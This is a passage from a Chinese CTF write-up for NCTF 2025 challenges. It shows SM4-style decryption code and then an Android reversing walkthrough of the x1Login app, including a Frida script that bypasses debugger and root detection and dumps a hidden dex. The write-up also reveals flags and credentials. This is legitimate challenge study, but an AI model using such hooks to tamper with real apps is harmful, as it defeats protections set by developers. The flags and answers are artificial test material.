class="comment">//进行循环加密,并将加密后数据保存（可以看出此处是以16字节为一次加密，进行循环，即若16字节则进行一次，17字节补0至32字节后进行加密两次，以此类推）</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*开始处理加密数据*/</span></span><br><span class="line">four_uCh2uLong(p + <span class="number">16</span> * j, &amp;(ulDataList[<span class="number">0</span>]));</span><br><span class="line">four_uCh2uLong(p + <span class="number">16</span> * j + <span class="number">4</span>, &amp;(ulDataList[<span class="number">1</span>]));</span><br><span class="line">four_uCh2uLong(p + <span class="number">16</span> * j + <span class="number">8</span>, &amp;(ulDataList[<span class="number">2</span>]));</span><br><span class="line">four_uCh2uLong(p + <span class="number">16</span> * j + <span class="number">12</span>, &amp;(ulDataList[<span class="number">3</span>]));</span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">ulDataList[i + <span class="number">4</span>] = ulDataList[i] ^ func_data(ulDataList[i + <span class="number">1</span>] ^ ulDataList[i + <span class="number">2</span>] ^ ulDataList[i + <span class="number">3</span>] ^ ulKeyList[i + <span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*将加密后数据输出*/</span></span><br><span class="line">uLong2four_uCh(ulDataList[<span class="number">35</span>], output + <span class="number">16</span> * j);</span><br><span class="line">uLong2four_uCh(ulDataList[<span class="number">34</span>], output + <span class="number">16</span> * j + <span class="number">4</span>);</span><br><span class="line">uLong2four_uCh(ulDataList[<span class="number">33</span>], output + <span class="number">16</span> * j + <span class="number">8</span>);</span><br><span class="line">uLong2four_uCh(ulDataList[<span class="number">32</span>], output + <span class="number">16</span> * j + <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密函数（与加密函数基本一致，只是秘钥使用的顺序不同，即把钥匙反着用就是解密）</span></span><br><span class="line"><span class="comment">//len:数据长度 key:密钥 input:输入的加密后数据 output:输出的解密后数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode_fun</span><span class="params">(u8 len, u8* key, u8* input, u8* output)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">u32 ulKeyTmpList[<span class="number">4</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;<span class="comment">//存储密钥的u32数据</span></span><br><span class="line">u32 ulKeyList[<span class="number">36</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;  <span class="comment">//用于密钥扩展算法与系统参数FK运算后的结果存储</span></span><br><span class="line">u32 ulDataList[<span class="number">36</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;; <span class="comment">//用于存放加密数据</span></span><br><span class="line"><span class="comment">/*开始生成子秘钥*/</span></span><br><span class="line">four_uCh2uLong(key, &amp;(ulKeyTmpList[<span class="number">0</span>]));</span><br><span class="line">four_uCh2uLong(key + <span class="number">4</span>, &amp;(ulKeyTmpList[<span class="number">1</span>]));</span><br><span class="line">four_uCh2uLong(key + <span class="number">8</span>, &amp;(ulKeyTmpList[<span class="number">2</span>]));</span><br><span class="line">four_uCh2uLong(key + <span class="number">12</span>, &amp;(ulKeyTmpList[<span class="number">3</span>]));</span><br><span class="line">ulKeyList[<span class="number">0</span>] = ulKeyTmpList[<span class="number">0</span>] ^ TBL_SYS_PARAMS[<span class="number">0</span>];</span><br><span class="line">ulKeyList[<span class="number">1</span>] = ulKeyTmpList[<span class="number">1</span>] ^ TBL_SYS_PARAMS[<span class="number">1</span>];</span><br><span class="line">ulKeyList[<span class="number">2</span>] = ulKeyTmpList[<span class="number">2</span>] ^ TBL_SYS_PARAMS[<span class="number">2</span>];</span><br><span class="line">ulKeyList[<span class="number">3</span>] = ulKeyTmpList[<span class="number">3</span>] ^ TBL_SYS_PARAMS[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)             <span class="comment">//32次循环迭代运算</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5-36为32个子秘钥</span></span><br><span class="line">ulKeyList[i + <span class="number">4</span>] = ulKeyList[i] ^ func_key(ulKeyList[i + <span class="number">1</span>] ^ ulKeyList[i + <span class="number">2</span>] ^ ulKeyList[i + <span class="number">3</span>] ^ TBL_FIX_PARAMS[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*生成32轮32位长子秘钥结束*/</span></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len / <span class="number">16</span>; j++)  <span class="comment">//进行循环加密,并将加密后数据保存</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*开始处理解密数据*/</span></span><br><span class="line">four_uCh2uLong(input + <span class="number">16</span> * j, &amp;(ulDataList[<span class="number">0</span>]));</span><br><span class="line">four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">4</span>, &amp;(ulDataList[<span class="number">1</span>]));</span><br><span class="line">four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">8</span>, &amp;(ulDataList[<span class="number">2</span>]));</span><br><span class="line">four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">12</span>, &amp;(ulDataList[<span class="number">3</span>]));</span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">ulDataList[i + <span class="number">4</span>] = ulDataList[i] ^ func_data(ulDataList[i + <span class="number">1</span>] ^ ulDataList[i + <span class="number">2</span>] ^ ulDataList[i + <span class="number">3</span>] ^ ulKeyList[<span class="number">35</span> - i]);<span class="comment">//与加密唯一不同的就是轮密钥的使用顺序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*将解密后数据输出*/</span></span><br><span class="line">uLong2four_uCh(ulDataList[<span class="number">35</span>], output + <span class="number">16</span> * j);</span><br><span class="line">uLong2four_uCh(ulDataList[<span class="number">34</span>], output + <span class="number">16</span> * j + <span class="number">4</span>);</span><br><span class="line">uLong2four_uCh(ulDataList[<span class="number">33</span>], output + <span class="number">16</span> * j + <span class="number">8</span>);</span><br><span class="line">uLong2four_uCh(ulDataList[<span class="number">32</span>], output + <span class="number">16</span> * j + <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无符号字符数组转16进制打印</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(u8* data, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> alTmp[<span class="number">16</span>] = &#123;</span><br><span class="line"> <span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, alTmp[data[i] / <span class="number">16</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, alTmp[data[i] % <span class="number">16</span>]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    u8 i, len;</span><br><span class="line">    u8 encode_Result[] = &#123;</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x97</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0x12</span>, <span class="number">0xDF</span>, <span class="number">0x13</span>, <span class="number">0x30</span>, <span class="number">0xF7</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0xEB</span>, <span class="number">0xA0</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x5B</span>, <span class="number">0xA6</span>, <span class="number">0x2A</span>, <span class="number">0xA8</span>, <span class="number">0x05</span>, <span class="number">0xA5</span>, <span class="number">0xF3</span>, <span class="number">0x76</span>, <span class="number">0xBE</span>, <span class="number">0xC9</span>, <span class="number">0x01</span>, <span class="number">0xF9</span>, <span class="number">0x36</span>, <span class="number">0x7B</span>, <span class="number">0x46</span>,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    u8 decode_Result[<span class="number">50</span>] = &#123; <span class="number">0</span> &#125;;    </span><br><span class="line">    u8 key[<span class="number">16</span>] = <span class="string">&quot;NCTF24nctfNCTF24&quot;</span>;       </span><br><span class="line">len = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//encode_fun(sizeof(Data_plain), key, Data_plain, encode_Result);            </span></span><br><span class="line">    <span class="comment">/*printf(&quot;加密后数据是：\n&quot;);*/</span></span><br><span class="line"></span><br><span class="line">    decode_fun(len, key, encode_Result, decode_Result);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, *(decode_Result + i));</span><br><span class="line"><span class="comment">//58cb925e0cd823c0d0b54fd06b820b7e</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以flag是NCTF{58cb925e0cd823c0d0b54fd06b820b7e}</p><h2 id="x1Login"><a href="#x1Login" class="headerlink" title="x1Login"></a>x1Login</h2><p>这是我第一次尝试用frida做安卓</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkSecutity</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Secure.checkDebug()) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Debugger Detected!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Secure.checkRoot()) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Root Detected!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有反调试，我选择frida到checkSecutity方法内，然后直接无操作返回(官方wp中显示用apktool解包，改，打包，签名，但是我一直报4字节的错，根本没办法解决，所以只得放弃)</p><p>然后就可以hook进去了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">    setContentView(C0890R.layout.activity_main);</span><br><span class="line">    checkSecutity();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(C0890R.C0893id.usernameEditText);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText2</span> <span class="operator">=</span> (EditText) findViewById(C0890R.C0893id.passwordEditText);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(C0890R.C0893id.loginButton);</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> DecStr.get(<span class="string">&quot;Exv3nhr5BNW0axn3aNz/DNv9C3q0wxj/Exe=&quot;</span>);</span><br><span class="line">    Intrinsics.checkNotNullExpressionValue(str, <span class="string">&quot;get(...)&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; cls = getClass(str);</span><br><span class="line">    <span class="keyword">if</span> (cls == <span class="literal">null</span>) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Error: Program load failure&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        finish();</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;System.exit returned normally, while it was supposed to halt JVM.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.nctf.simplelogin.MainActivity$$ExternalSyntheticLambda0</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            MainActivity.onCreate$lambda$<span class="number">0</span>(editText, editText2, <span class="built_in">this</span>, cls, view);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数静态分析，前面是界面不必理会，一直到DecStr.get开始有东西，双击DecStr</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecStr</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">get</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;simple&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是.so层的调用，如果.so分析的话</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sub_7C0(</span><br><span class="line">    v5,</span><br><span class="line">    aAbcdefghijklmn,                            <span class="comment">// &quot;AbcdefghijklmnopqrstuvwxyzaBCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span></span><br><span class="line">    s);</span><br><span class="line">n8 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)s);</span><br><span class="line">v18 = n8 - n8_1;</span><br><span class="line">v19 = (<span class="type">char</span> *)s + n8_1;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    --v18;</span><br><span class="line">    *v19++ ^= n8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑其实就是这样，base解码+异或长度Exv3nhr5BNW0axn3aNz&#x2F;DNv9C3q0wxj&#x2F;Exe&#x3D;-&gt;com.nctf.simplelogin.Check</p><p>当然也可以frida</p><p>var str &#x3D; DecStr.get(“Exv3nhr5BNW0axn3aNz&#x2F;DNv9C3q0wxj&#x2F;Exe&#x3D;”);</p><p>console.log(‘[+] DecStr 解密结果: ‘ + str);</p><p>总之这里是获取了方法名，后面final Class&lt;?&gt; cls &#x3D; getClass(str);+MainActivity.onCreate$lambda$0(editText, editText2, this, cls, view);</p><p>也就是加载方法，点击调用，跟着进到getClass里面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class&lt;?&gt; getClass(String str) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InMemoryDexClassLoader</span>(ByteBuffer.wrap(Secure.loadDex(getApplicationContext(), DecStr.get(<span class="string">&quot;ygvUF2vHFgbPiN9J&quot;</span>))), getClassLoader()).loadClass(str);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里实现的是加载dex文件，frida getApplicationContext()得到<code>android.app.Application@da4db40</code></p><p>ygvUF2vHFgbPiN9J对应的是libsimple.so</p><p>所以这里是加载方法，关键方法是loadDex，所以可以进到这个函数中加载dex，然后用frida保存下来，整体dex如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 获取 MainActivity</span></span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.nctf.simplelogin.MainActivity&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Hook checkSecutity 方法，使其不执行</span></span><br><span class="line">  <span class="title class_">MainActivity</span>.<span class="property">checkSecutity</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] debugger&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">Secure</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.nctf.simplelogin.Secure&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">ContextWrapper</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.content.ContextWrapper&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">File</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.io.File&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">FileOutputStream</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.io.FileOutputStream&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Secure</span>.<span class="property">loadDex</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">ctx, dexName</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Dex 载入自: &quot;</span> + dexName);</span><br><span class="line">    <span class="keyword">var</span> dexData = <span class="variable language_">this</span>.<span class="title function_">loadDex</span>(ctx, dexName); <span class="comment">// dexData 是 Java bytes[]</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Dex 长度: &quot;</span> + dexData.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取应用的外部存储目录</span></span><br><span class="line">    <span class="keyword">var</span> context = <span class="title class_">Java</span>.<span class="title function_">cast</span>(ctx, <span class="title class_">ContextWrapper</span>);</span><br><span class="line">    <span class="keyword">var</span> path = context.<span class="title function_">getExternalFilesDir</span>(<span class="literal">null</span>).<span class="title function_">getAbsolutePath</span>() + <span class="string">&quot;/dumped.dex&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Dex 保存路径: &quot;</span> + path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 写入文件</span></span><br><span class="line">      <span class="keyword">var</span> file = <span class="title class_">File</span>.$new(path);</span><br><span class="line">      <span class="keyword">var</span> fos = <span class="title class_">FileOutputStream</span>.$new(file);</span><br><span class="line">      fos.<span class="title function_">write</span>(dexData);  <span class="comment">// 直接写入 Java bytes[]</span></span><br><span class="line">      fos.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Dex 保存成功！&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[!] 保存 Dex 失败: &quot;</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dexData;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>得到dex.dex</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">nctf</span>.<span class="property">simplelogin</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.<span class="property">content</span>.<span class="property">Context</span>;</span><br><span class="line"><span class="keyword">import</span> android.<span class="property">widget</span>.<span class="property">Toast</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">security</span>.<span class="property">MessageDigest</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: D:\study\ctf\2025nctf\x1Login-release\dex_dumped.dex */</span></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Check</span> &#123;</span><br><span class="line">    <span class="title class_">Context</span> context;</span><br><span class="line">    <span class="title class_">String</span> password;</span><br><span class="line">    <span class="title class_">String</span> username;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">Check</span>(<span class="title class_">Context</span> context, <span class="title class_">String</span> username, <span class="title class_">String</span> password) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">username</span> = username;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">password</span> = password;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">context</span> = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">check_username</span>()) &#123;</span><br><span class="line">                <span class="title class_">MessageDigest</span> digest = <span class="title class_">MessageDigest</span>.<span class="title function_">getInstance</span>(<span class="title class_">DecStr</span>.<span class="title function_">get</span>(<span class="string">&quot;tMC2&quot;</span>));</span><br><span class="line">                digest.<span class="title function_">update</span>(<span class="variable language_">this</span>.<span class="property">username</span>.<span class="title function_">getBytes</span>());</span><br><span class="line">                byte[] output = digest.<span class="title function_">digest</span>();</span><br><span class="line">                boolean result = <span class="title function_">check_password</span>(output);</span><br><span class="line">                <span class="keyword">if</span> (result) &#123;</span><br><span class="line">                    <span class="title class_">Toast</span>.<span class="title function_">makeText</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="string">&quot;Login Successful! Now submit your flag!&quot;</span>, <span class="number">0</span>).<span class="title function_">show</span>();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title class_">Toast</span>.<span class="title function_">makeText</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="string">&quot;Login Failed!&quot;</span>, <span class="number">0</span>).<span class="title function_">show</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">            e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean <span class="title function_">check_username</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">username</span>.<span class="title function_">equals</span>(<span class="title class_">DecStr</span>.<span class="title function_">get</span>(<span class="string">&quot;uZPOs29goMu6l38=&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean <span class="title function_">check_password</span>(<span class="params">byte[] key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Secure</span>.<span class="title function_">doCheck</span>(<span class="variable language_">this</span>.<span class="property">password</span>, key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单解密，this.username.equals(DecStr.get(“uZPOs29goMu6l38&#x3D;”));也就是账号&#x3D;X1c@dM1n1$t</p><p>tMC2&#x3D;Md5 </p><p>逻辑就是加载Md5，然后对账号名Md5，调用Secure.doCheck</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">class</span> <span class="title class_">Secure</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> native boolean <span class="title function_">doCheck</span>(<span class="title class_">String</span> str, byte[] bArr);</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> native byte[] <span class="title function_">loadDex</span>(<span class="title class_">Context</span> context, <span class="title class_">String</span> str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="title function_">loadLibrary</span>(<span class="title class_">DecStr</span>.<span class="title function_">get</span>(<span class="string">&quot;agDYB3bJ&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从这里可以看到doCheck也是.so层的，并且这个Secure调用的.so层是libnative.so(解密agDYB3bJ得到native)，那么就找doCheck，但是发现.so文件中并没有标识，ida调试也会跑飞</p><p>不过好在函数也不多，找找也找到了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 